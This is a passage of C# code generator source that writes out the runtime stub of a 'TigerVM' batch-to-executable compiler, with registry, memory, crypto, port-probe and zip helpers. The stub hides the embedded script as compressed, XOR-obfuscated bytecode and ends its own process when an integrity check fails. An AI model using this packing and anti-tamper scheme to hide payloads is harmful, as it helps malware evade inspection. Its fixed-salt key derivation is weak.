            csBld.AppendLine("                SkipWs(json, ref idx); if (idx >= json.Length || json[idx] == ']') { if (idx < json.Length) idx++; break; }");
            csBld.AppendLine("                if (json[idx] == ',') { idx++; continue; }");
            csBld.AppendLine("                object val = ParseValue(json, ref idx); list.Add(val);");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return list;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static string ParseString(string json, ref int idx) {");
            csBld.AppendLine("            char quote = json[idx++]; var sb = new StringBuilder();");
            csBld.AppendLine("            while (idx < json.Length) {");
            csBld.AppendLine("                char c = json[idx++]; if (c == quote) break;");
            csBld.AppendLine("                if (c == '\\\\' && idx < json.Length) {");
            csBld.AppendLine("                    char esc = json[idx++];");
            csBld.AppendLine("                    if (esc == 'n') sb.Append((char)10);");
            csBld.AppendLine("                    else if (esc == 'r') sb.Append((char)13);");
            csBld.AppendLine("                    else if (esc == 't') sb.Append((char)9);");
            csBld.AppendLine("                    else if (esc == 'b') sb.Append((char)8);");
            csBld.AppendLine("                    else if (esc == 'f') sb.Append((char)12);");
            csBld.AppendLine("                    else if (esc == 'u' && idx + 4 <= json.Length) {");
            csBld.AppendLine("                        string hex = json.Substring(idx, 4);");
            csBld.AppendLine("                        int code;");
            csBld.AppendLine("                        if (int.TryParse(hex, System.Globalization.NumberStyles.HexNumber, null, out code)) { sb.Append((char)code); idx += 4; }");
            csBld.AppendLine("                        else sb.Append(esc);");
            csBld.AppendLine("                    } else sb.Append(esc);");
            csBld.AppendLine("                } else sb.Append(c);");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return sb.ToString();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static object ParseNumber(string json, ref int idx) {");
            csBld.AppendLine("            int start = idx; while (idx < json.Length && (char.IsDigit(json[idx]) || json[idx] == '.' || json[idx] == '-' || json[idx] == '+' || json[idx] == 'e' || json[idx] == 'E')) idx++;");
            csBld.AppendLine("            return json.Substring(start, idx - start);");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static void SkipWs(string json, ref int idx) {");
            csBld.AppendLine("            while (idx < json.Length && char.IsWhiteSpace(json[idx])) idx++;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static bool SqlExec(string sql) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                sql = (sql ?? \"\").Trim().Trim('\"');");
            csBld.AppendLine("                lock (_dbLock) {");
            csBld.AppendLine("                    if (sql.StartsWith(\"CREATE TABLE\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                        int pStart = sql.IndexOf('('); int pEnd = sql.LastIndexOf(')');");
            csBld.AppendLine("                        string tableName = sql.Substring(12, pStart - 12).Trim(); string colsRaw = sql.Substring(pStart + 1, pEnd - pStart - 1);");
            csBld.AppendLine("                        var dt = new System.Data.DataTable(tableName);");
            csBld.AppendLine("                        foreach (string c in colsRaw.Split(',')) { string colName = c.Trim().Split(new char[]{' '}, StringSplitOptions.RemoveEmptyEntries)[0]; dt.Columns.Add(colName, typeof(string)); }");
            csBld.AppendLine("                        if (_db.Tables.Contains(tableName)) _db.Tables.Remove(tableName);");
            csBld.AppendLine("                        _db.Tables.Add(dt); return true;");
            csBld.AppendLine("                    } else if (sql.StartsWith(\"INSERT INTO\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                        int vIdx = sql.IndexOf(\"VALUES\", StringComparison.OrdinalIgnoreCase); string tableName = sql.Substring(11, vIdx - 11).Trim();");
            csBld.AppendLine("                        int pStart = sql.IndexOf('(', vIdx); int pEnd = sql.LastIndexOf(')'); string valsRaw = sql.Substring(pStart + 1, pEnd - pStart - 1);");
            csBld.AppendLine("                        var dt = _db.Tables[tableName];");
            csBld.AppendLine("                        if (dt != null) {");
            csBld.AppendLine("                            var row = dt.NewRow();");
            csBld.AppendLine("                            List<string> vals = SplitSqlValues(valsRaw);");
            csBld.AppendLine("                            for (int i = 0; i < vals.Count && i < dt.Columns.Count; i++) {");
            csBld.AppendLine("                                row[i] = vals[i];");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                            dt.Rows.Add(row); return true;");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { } return false;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static List<string> SplitSqlValues(string raw) {");
            csBld.AppendLine("            List<string> res = new List<string>();");
            csBld.AppendLine("            StringBuilder cur = new StringBuilder();");
            csBld.AppendLine("            bool inQuotes = false; char qChar = '\\0';");
            csBld.AppendLine("            for (int i = 0; i < raw.Length; i++) {");
            csBld.AppendLine("                char c = raw[i];");
            csBld.AppendLine("                if ((c == '\\'' || c == '\"') && (!inQuotes || c == qChar)) {");
            csBld.AppendLine("                    inQuotes = !inQuotes; qChar = inQuotes ? c : '\\0';");
            csBld.AppendLine("                } else if (c == ',' && !inQuotes) {");
            csBld.AppendLine("                    res.Add(cur.ToString().Trim().Trim('\\'', '\"'));");
            csBld.AppendLine("                    cur.Length = 0;");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    cur.Append(c);");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("            if (cur.Length > 0) res.Add(cur.ToString().Trim().Trim('\\'', '\"'));");
            csBld.AppendLine("            return res;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string SqlQuery(string sql) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                sql = (sql ?? \"\").Trim().Trim('\"');");
            csBld.AppendLine("                lock (_dbLock) {");
            csBld.AppendLine("                    if (sql.StartsWith(\"SELECT\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                        int fromIdx = sql.IndexOf(\"FROM\", StringComparison.OrdinalIgnoreCase); string selectPart = sql.Substring(6, fromIdx - 6).Trim();");
            csBld.AppendLine("                        int whereIdx = sql.IndexOf(\"WHERE\", StringComparison.OrdinalIgnoreCase); string tableName = (whereIdx != -1) ? sql.Substring(fromIdx + 4, whereIdx - (fromIdx + 4)).Trim() : sql.Substring(fromIdx + 4).Trim();");
            csBld.AppendLine("                        var dt = _db.Tables[tableName];");
            csBld.AppendLine("                        if (dt != null) {");
            csBld.AppendLine("                            string filter = (whereIdx != -1) ? sql.Substring(whereIdx + 5).Trim() : \"\";");
            csBld.AppendLine("                            System.Data.DataRow[] rows = string.IsNullOrEmpty(filter) ? dt.Select() : dt.Select(filter);");
            csBld.AppendLine("                            if (rows.Length > 0) {");
            csBld.AppendLine("                                if (selectPart == \"*\") { var items = new List<string>(); foreach (var item in rows[0].ItemArray) items.Add(item.ToString()); return string.Join(\" | \", items.ToArray()); }");
            csBld.AppendLine("                                else if (dt.Columns.Contains(selectPart)) { return rows[0][selectPart].ToString(); }");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { } return \"\";");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ClipGet() { try { return System.Windows.Forms.Clipboard.GetText(); } catch { return \"\"; } }");
            csBld.AppendLine("        public static void ClipSet(string text) { try { System.Windows.Forms.Clipboard.SetText((text ?? \"\").Trim().Trim('\"', '\\'')); } catch { } }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerCrypto {");
            csBld.AppendLine("        public static string AesEncrypt(string plainText, string password) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                plainText = (plainText ?? \"\").Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                password = (password ?? \"\").Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);");
            csBld.AppendLine("                byte[] salt = new byte[] { 0x54, 0x69, 0x67, 0x65, 0x72, 0x56, 0x4D, 0x37 };");
            csBld.AppendLine("                using (Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt, 1000)) using (RijndaelManaged aes = new RijndaelManaged()) {");
            csBld.AppendLine("                    aes.KeySize = 256; aes.Key = pdb.GetBytes(32); aes.IV = pdb.GetBytes(16);");
            csBld.AppendLine("                    using (MemoryStream ms = new MemoryStream()) {");
            csBld.AppendLine("                        using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write)) { cs.Write(plainBytes, 0, plainBytes.Length); cs.Close(); }");
            csBld.AppendLine("                        return Convert.ToBase64String(ms.ToArray());");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string AesDecrypt(string cipherText, string password) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                cipherText = (cipherText ?? \"\").Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                password = (password ?? \"\").Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                byte[] cipherBytes = Convert.FromBase64String(cipherText);");
            csBld.AppendLine("                byte[] salt = new byte[] { 0x54, 0x69, 0x67, 0x65, 0x72, 0x56, 0x4D, 0x37 };");
            csBld.AppendLine("                using (Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, salt, 1000)) using (RijndaelManaged aes = new RijndaelManaged()) {");
            csBld.AppendLine("                    aes.KeySize = 256; aes.Key = pdb.GetBytes(32); aes.IV = pdb.GetBytes(16);");
            csBld.AppendLine("                    using (MemoryStream ms = new MemoryStream()) {");
            csBld.AppendLine("                        using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write)) { cs.Write(cipherBytes, 0, cipherBytes.Length); cs.Close(); }");
            csBld.AppendLine("                        return Encoding.UTF8.GetString(ms.ToArray());");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ComputeSha256(string input) {");
            csBld.AppendLine("            try { using (SHA256 sha = SHA256.Create()) { byte[] bytes = sha.ComputeHash(Encoding.UTF8.GetBytes(input ?? \"\")); StringBuilder sb = new StringBuilder(); foreach (byte b in bytes) sb.Append(b.ToString(\"x2\")); return sb.ToString(); } } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ComputeMd5(string input) {");
            csBld.AppendLine("            try { using (MD5 md5 = MD5.Create()) { byte[] bytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input ?? \"\")); StringBuilder sb = new StringBuilder(); foreach (byte b in bytes) sb.Append(b.ToString(\"x2\")); return sb.ToString(); } } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string Base64Encode(string input) { try { return Convert.ToBase64String(Encoding.UTF8.GetBytes(input ?? \"\")); } catch { return \"\"; } }");
            csBld.AppendLine("        public static string Base64Decode(string b64) { try { return Encoding.UTF8.GetString(Convert.FromBase64String(b64 ?? \"\")); } catch { return \"\"; } }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerSystem {");
            csBld.AppendLine("        public static string RegRead(string hive, string path, string name) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                Microsoft.Win32.RegistryKey root = hive.Equals(\"HKLM\", StringComparison.OrdinalIgnoreCase) || hive.Equals(\"HKEY_LOCAL_MACHINE\", StringComparison.OrdinalIgnoreCase) ? Microsoft.Win32.Registry.LocalMachine : Microsoft.Win32.Registry.CurrentUser;");
            csBld.AppendLine("                using (var sub = root.OpenSubKey(path, false)) {");
            csBld.AppendLine("                    if (sub == null) return \"\";");
            csBld.AppendLine("                    object val = sub.GetValue(name);");
            csBld.AppendLine("                    return val != null ? val.ToString() : \"\";");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static bool RegWrite(string hive, string path, string name, string data, string type) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                Microsoft.Win32.RegistryKey root = hive.Equals(\"HKLM\", StringComparison.OrdinalIgnoreCase) || hive.Equals(\"HKEY_LOCAL_MACHINE\", StringComparison.OrdinalIgnoreCase) ? Microsoft.Win32.Registry.LocalMachine : Microsoft.Win32.Registry.CurrentUser;");
            csBld.AppendLine("                using (var sub = root.CreateSubKey(path)) {");
            csBld.AppendLine("                    if (sub == null) return false;");
            csBld.AppendLine("                    if (type.Equals(\"DWORD\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                        int intVal = 0; int.TryParse(data, out intVal);");
            csBld.AppendLine("                        sub.SetValue(name, intVal, Microsoft.Win32.RegistryValueKind.DWord);");
            csBld.AppendLine("                    } else if (type.Equals(\"QWORD\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                        long longVal = 0; long.TryParse(data, out longVal);");
            csBld.AppendLine("                        sub.SetValue(name, longVal, Microsoft.Win32.RegistryValueKind.QWord);");
            csBld.AppendLine("                    } else {");
            csBld.AppendLine("                        sub.SetValue(name, data, Microsoft.Win32.RegistryValueKind.String);");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    return true;");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return false; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string GetSysInfo(string prop) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                prop = (prop ?? \"\").Trim().ToUpperInvariant();");
            csBld.AppendLine("                if (prop == \"CPU_COUNT\") return Environment.ProcessorCount.ToString();");
            csBld.AppendLine("                if (prop == \"OS_VERSION\") return Environment.OSVersion.ToString();");
            csBld.AppendLine("                if (prop == \"IS_64BIT\") return Environment.Is64BitOperatingSystem ? \"TRUE\" : \"FALSE\";");
            csBld.AppendLine("                if (prop == \"MACHINE_NAME\") return Environment.MachineName;");
            csBld.AppendLine("                if (prop == \"USER_NAME\") return Environment.UserName;");
            csBld.AppendLine("                if (prop == \"UPTIME_SEC\") return (Environment.TickCount / 1000).ToString();");
            csBld.AppendLine("                if (prop == \"RAM_TOTAL_MB\" || prop == \"RAM_FREE_MB\") {");
            csBld.AppendLine("                    long ws = Process.GetCurrentProcess().WorkingSet64 / (1024 * 1024);");
            csBld.AppendLine("                    return ws.ToString();");
            csBld.AppendLine("                }");
            csBld.AppendLine("                return Environment.GetEnvironmentVariable(prop) ?? \"N/A\";");
            csBld.AppendLine("            } catch { return \"N/A\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string NetPing(string host, int port, int timeoutMs) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                using (var client = new System.Net.Sockets.TcpClient()) {");
            csBld.AppendLine("                    var ar = client.BeginConnect(host, port, null, null);");
            csBld.AppendLine("                    bool ok = ar.AsyncWaitHandle.WaitOne(timeoutMs <= 0 ? 2000 : timeoutMs);");
            csBld.AppendLine("                    if (ok && client.Connected) { client.EndConnect(ar); return \"OPEN\"; }");
            csBld.AppendLine("                    return \"CLOSED\";");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"ERROR\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void UnzipToVfs(string zipSrc, string prefix, Dictionary<string, string> vfsDict) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                byte[] zipBytes = null;");
            csBld.AppendLine("                if (vfsDict.ContainsKey(zipSrc)) zipBytes = Convert.FromBase64String(vfsDict[zipSrc]);");
            csBld.AppendLine("                else if (File.Exists(zipSrc)) zipBytes = File.ReadAllBytes(zipSrc);");
            csBld.AppendLine("                if (zipBytes == null) return;");
            csBld.AppendLine("                using (MemoryStream ms = new MemoryStream(zipBytes))");
            csBld.AppendLine("                using (System.IO.Compression.ZipArchive za = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Read)) {");
            csBld.AppendLine("                    foreach (var entry in za.Entries) {");
            csBld.AppendLine("                        if (string.IsNullOrEmpty(entry.Name)) continue;");
            csBld.AppendLine("                        using (var es = entry.Open()) using (var ems = new MemoryStream()) {");
            csBld.AppendLine("                            es.CopyTo(ems);");
            csBld.AppendLine("                            string vKey = prefix.TrimEnd('\\\\', '/') + \"\\\\\" + entry.FullName.Replace(\"/\", \"\\\\\");");
            csBld.AppendLine("                            vfsDict[vKey] = Convert.ToBase64String(ems.ToArray());");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerMemory {");
            csBld.AppendLine("        public static string Alloc(int bytes) {");
            csBld.AppendLine("            try { IntPtr p = Marshal.AllocHGlobal(bytes); return \"0x\" + p.ToInt64().ToString(\"X\"); } catch { return \"0x0\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void Free(string ptrHex) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                long addr = Convert.ToInt64(ptrHex.StartsWith(\"0x\", StringComparison.OrdinalIgnoreCase) ? ptrHex.Substring(2) : ptrHex, 16);");
            csBld.AppendLine("                if (addr != 0) Marshal.FreeHGlobal(new IntPtr(addr));");
            csBld.AppendLine("            } catch { }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void WriteString(string ptrHex, string text) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                long addr = Convert.ToInt64(ptrHex.StartsWith(\"0x\", StringComparison.OrdinalIgnoreCase) ? ptrHex.Substring(2) : ptrHex, 16);");
            csBld.AppendLine("                if (addr == 0) return;");
            csBld.AppendLine("                byte[] bytes = Encoding.UTF8.GetBytes(text + \"\\0\");");
            csBld.AppendLine("                Marshal.Copy(bytes, 0, new IntPtr(addr), bytes.Length);");
            csBld.AppendLine("            } catch { }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ReadString(string ptrHex, int maxLen) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                long addr = Convert.ToInt64(ptrHex.StartsWith(\"0x\", StringComparison.OrdinalIgnoreCase) ? ptrHex.Substring(2) : ptrHex, 16);");
            csBld.AppendLine("                if (addr == 0) return \"\";");
            csBld.AppendLine("                byte[] buf = new byte[maxLen <= 0 ? 256 : maxLen];");
            csBld.AppendLine("                Marshal.Copy(new IntPtr(addr), buf, 0, buf.Length);");
            csBld.AppendLine("                int nullIdx = Array.IndexOf(buf, (byte)0);");
            csBld.AppendLine("                if (nullIdx != -1) return Encoding.UTF8.GetString(buf, 0, nullIdx);");
            csBld.AppendLine("                return Encoding.UTF8.GetString(buf);");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public class VmCode {");
            csBld.AppendLine("        public int Op;");
            csBld.AppendLine("        public string A1;");
            csBld.AppendLine("        public string A2;");
            csBld.AppendLine("        public string A3;");
            csBld.AppendLine("        public string A4;");
            csBld.AppendLine("        public bool F1;");
            csBld.AppendLine("        public bool F2;");
            csBld.AppendLine("        public int Iv;");
            csBld.AppendLine("        public int StateId;");
            csBld.AppendLine("        public int NextStateId;");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public class Program {");
            csBld.AppendLine("        private static readonly string BytecodeBlob = \"" + b64Bytecode + "\";");
            csBld.AppendLine("        private static readonly string KeyBlob = \"" + b64Key + "\";");
            csBld.AppendLine("        private static readonly string IntegritySeal = \"" + bytecodeSha256 + "\";");
            csBld.AppendLine("        private static readonly Dictionary<byte, int> _opMap = new Dictionary<byte, int>();");
            csBld.AppendLine("        private static readonly Dictionary<string, string> EmbeddedFiles = new Dictionary<string, string>();");
            csBld.AppendLine("        private static readonly Dictionary<string, string> Variables = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);");
            csBld.AppendLine("        private static readonly List<System.Threading.Thread> _activeThreads = new List<System.Threading.Thread>();");
            csBld.AppendLine("        private static readonly object _threadLock = new object();");
            csBld.AppendLine("        private static readonly Random Rnd = new Random();");
            csBld.AppendLine("        private static bool _echoOn = false;");
            csBld.AppendLine("        private static int _exitCode = 0;");
            csBld.AppendLine("        private static string[] _cliArgs = new string[0];");
            csBld.AppendLine("");
            csBld.AppendLine("        [STAThread]");
            csBld.AppendLine("        static int Main(string[] args) {");
            csBld.AppendLine("            Console.OutputEncoding = Encoding.UTF8;");
            csBld.AppendLine("            _cliArgs = args;");
            csBld.AppendLine(armorCall);
            csBld.AppendLine("            InitOpMap();");
            csBld.AppendLine("            InitEnvironment();");
            csBld.AppendLine(embedCode.ToString());
            csBld.AppendLine("            try {");
            csBld.AppendLine("                byte[] rawComp = Convert.FromBase64String(BytecodeBlob);");
            csBld.AppendLine("                VerifyIntegrity(rawComp);");
            csBld.AppendLine("                byte[] raw;");
            csBld.AppendLine("                using (MemoryStream msIn = new MemoryStream(rawComp))");
            csBld.AppendLine("                using (DeflateStream ds = new DeflateStream(msIn, CompressionMode.Decompress))");
            csBld.AppendLine("                using (MemoryStream msOut = new MemoryStream()) {");
            csBld.AppendLine("                    ds.CopyTo(msOut);");
            csBld.AppendLine("                    raw = msOut.ToArray();");
            csBld.AppendLine("                }");
            csBld.AppendLine("                byte[] k = Convert.FromBase64String(KeyBlob);");
            csBld.AppendLine("                byte[] dec = Decrypt(raw, k);");
            csBld.AppendLine("                ExecuteBytecode(dec);");
            csBld.AppendLine("            } catch (Exception ex) {");
            csBld.AppendLine("                Console.Error.WriteLine(\"[TigerVM Error] \" + ex.Message);");
            csBld.AppendLine("                _exitCode = 1;");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return _exitCode;");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void VerifyIntegrity(byte[] raw) {");
            csBld.AppendLine("            using (SHA256 sha = SHA256.Create()) {");
            csBld.AppendLine("                byte[] hash = sha.ComputeHash(raw);");
            csBld.AppendLine("                string cur = BitConverter.ToString(hash).Replace(\"-\", \"\").ToLowerInvariant();");
            csBld.AppendLine("                if (!cur.Equals(IntegritySeal, StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    Process.GetCurrentProcess().Kill();");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void InitOpMap() {");
            csBld.Append(opcodeMapInit.ToString());
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static byte[] Decrypt(byte[] data, byte[] key) {");
            csBld.AppendLine("            byte[] res = new byte[data.Length];");
            csBld.AppendLine("            for (int i = 0; i < data.Length; i++) {");
            csBld.AppendLine("                res[i] = (byte)(data[i] ^ key[i % key.Length] ^ (i & 0xFF));");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return res;");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void InitEnvironment() {");
            csBld.AppendLine("            lock (_threadLock) {");
            csBld.AppendLine("                foreach (System.Collections.DictionaryEntry env in Environment.GetEnvironmentVariables()) {");
            csBld.AppendLine("                    Variables[env.Key.ToString()] = env.Value != null ? env.Value.ToString() : \"\";");
            csBld.AppendLine("                }");
            csBld.AppendLine("                string exePath = Assembly.GetExecutingAssembly().Location;");
            csBld.AppendLine("                string exeDir = AppDomain.CurrentDomain.BaseDirectory.TrimEnd('\\\\');");
            csBld.AppendLine("                Variables[\"~dp0\"] = exeDir + \"\\\\\";");
            csBld.AppendLine("                Variables[\"~f0\"] = exePath;");
            csBld.AppendLine("                Variables[\"~nx0\"] = Path.GetFileName(exePath);");
            csBld.AppendLine("                Variables[\"0\"] = exePath;");
            csBld.AppendLine("                for (int i = 0; i < _cliArgs.Length && i < 9; i++) {");
            csBld.AppendLine("                    Variables[(i + 1).ToString()] = _cliArgs[i];");
            csBld.AppendLine("                }");
            csBld.AppendLine("                Variables[\"*\"] = string.Join(\" \", _cliArgs);");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static string ExpandVars(string input) {");
            csBld.AppendLine("            if (string.IsNullOrEmpty(input)) return \"\";");
            csBld.AppendLine("            input = Regex.Replace(input, @\"%(~[a-zA-Z]*([0-9]))|%([0-9]|\\*)\", m => {");
            csBld.AppendLine("                if (m.Groups[1].Success) {");
            csBld.AppendLine("                    string mod = m.Groups[1].Value;");
            csBld.AppendLine("                    lock (_threadLock) { if (Variables.ContainsKey(mod)) return Variables[mod]; }");
            csBld.AppendLine("                    string argNum = m.Groups[2].Value;");
            csBld.AppendLine("                    lock (_threadLock) {");
            csBld.AppendLine("                        if (Variables.ContainsKey(argNum)) {");
            csBld.AppendLine("                            string targetPath = Variables[argNum];");
            csBld.AppendLine("                            if (mod.StartsWith(\"~dp\") && !string.IsNullOrEmpty(targetPath)) {");
            csBld.AppendLine("                                try { return Path.GetDirectoryName(Path.GetFullPath(targetPath)) + \"\\\\\"; } catch { }");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                            if (mod.StartsWith(\"~nx\") && !string.IsNullOrEmpty(targetPath)) {");
            csBld.AppendLine("                                try { return Path.GetFileName(targetPath); } catch { }");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                            if (mod.StartsWith(\"~f\") && !string.IsNullOrEmpty(targetPath)) {");
            csBld.AppendLine("                                try { return Path.GetFullPath(targetPath); } catch { }");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    return \"%\" + mod;");
            csBld.AppendLine("                }");
            csBld.AppendLine("                if (m.Groups[3].Success) {");
            csBld.AppendLine("                    string argKey = m.Groups[3].Value;");
            csBld.AppendLine("                    lock (_threadLock) { if (Variables.ContainsKey(argKey)) return Variables[argKey]; }");
            csBld.AppendLine("                    return \"\";");
            csBld.AppendLine("                }");
            csBld.AppendLine("                return m.Value;");
            csBld.AppendLine("            });");
            csBld.AppendLine("            input = input.Replace(\"%CD%\", Directory.GetCurrentDirectory())");
            csBld.AppendLine("                         .Replace(\"%RANDOM%\", Rnd.Next(0, 32767).ToString())");
            csBld.AppendLine("                         .Replace(\"%DATE%\", DateTime.Now.ToString(\"yyyy-MM-dd\"))");
            csBld.AppendLine("                         .Replace(\"%TIME%\", DateTime.Now.ToString(\"HH:mm:ss.ff\"))");
            csBld.AppendLine("                         .Replace(\"%ERRORLEVEL%\", _exitCode.ToString());");
            csBld.AppendLine("            Func<string, string> resolveVar = (varExpr) => {");
            csBld.AppendLine("                lock (_threadLock) { if (Variables.ContainsKey(varExpr)) return Variables[varExpr]; }");
            csBld.AppendLine("                if (varExpr.Contains(\":~\")) {");
            csBld.AppendLine("                    int colon = varExpr.IndexOf(\":~\");");
            csBld.AppendLine("                    string vname = varExpr.Substring(0, colon);");
            csBld.AppendLine("                    string slice = varExpr.Substring(colon + 2);");
            csBld.AppendLine("                    string val = \"\";");
            csBld.AppendLine("                    lock (_threadLock) { val = Variables.ContainsKey(vname) ? Variables[vname] : Environment.GetEnvironmentVariable(vname) ?? \"\"; }");
            csBld.AppendLine("                    string[] parts = slice.Split(',');");
            csBld.AppendLine("                    int start = 0; int.TryParse(parts[0], out start);");
            csBld.AppendLine("                    if (start < 0) start = Math.Max(0, val.Length + start);");
            csBld.AppendLine("                    if (start >= val.Length) return \"\";");
            csBld.AppendLine("                    if (parts.Length > 1) {");
            csBld.AppendLine("                        int len = 0; int.TryParse(parts[1], out len);");
            csBld.AppendLine("                        if (len < 0) len = Math.Max(0, val.Length - start + len);");
            csBld.AppendLine("                        len = Math.Min(len, val.Length - start);");
            csBld.AppendLine("                        return val.Substring(start, Math.Max(0, len));");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    return val.Substring(start);");
            csBld.AppendLine("                }");
            csBld.AppendLine("                if (varExpr.Contains(\":\") && varExpr.Contains(\"=\")) {");
            csBld.AppendLine("                    int colon = varExpr.IndexOf(':');");
            csBld.AppendLine("                    string vname = varExpr.Substring(0, colon);");
            csBld.AppendLine("                    string sub = varExpr.Substring(colon + 1);");
            csBld.AppendLine("                    int eq = sub.IndexOf('=');");
            csBld.AppendLine("                    string find = sub.Substring(0, eq);");
            csBld.AppendLine("                    string repl = sub.Substring(eq + 1);");
            csBld.AppendLine("                    string val = \"\";");
            csBld.AppendLine("                    lock (_threadLock) { val = Variables.ContainsKey(vname) ? Variables[vname] : Environment.GetEnvironmentVariable(vname) ?? \"\"; }");
            csBld.AppendLine("                    return val.Replace(find, repl);");
            csBld.AppendLine("                }");
            csBld.AppendLine("                string sysEnv = Environment.GetEnvironmentVariable(varExpr);");
            csBld.AppendLine("                if (sysEnv != null) return sysEnv;");
            csBld.AppendLine("                return \"\";");
            csBld.AppendLine("            };");
            csBld.AppendLine("            input = Regex.Replace(input, @\"%([^%!]+)%\", m => resolveVar(m.Groups[1].Value));");
            csBld.AppendLine("            input = Regex.Replace(input, @\"!([^%!]+)!\", m => resolveVar(m.Groups[1].Value));");
            csBld.AppendLine("            return input;");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static long EvalMath(string expr) {");
            csBld.AppendLine("            if (string.IsNullOrEmpty(expr)) return 0;");
            csBld.AppendLine("            lock (_threadLock) {");
            csBld.AppendLine("                return NativeJit.Eval(expr, Variables);");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("");
            csBld.AppendLine("        private static void ExecuteSubRoutineThread(int startIp, List<VmCode> instrs, Dictionary<string, int> labels) {");
            csBld.AppendLine("            int tip = startIp;");
            csBld.AppendLine("            while (tip < instrs.Count) {");
            csBld.AppendLine("                VmCode inst = instrs[tip];");
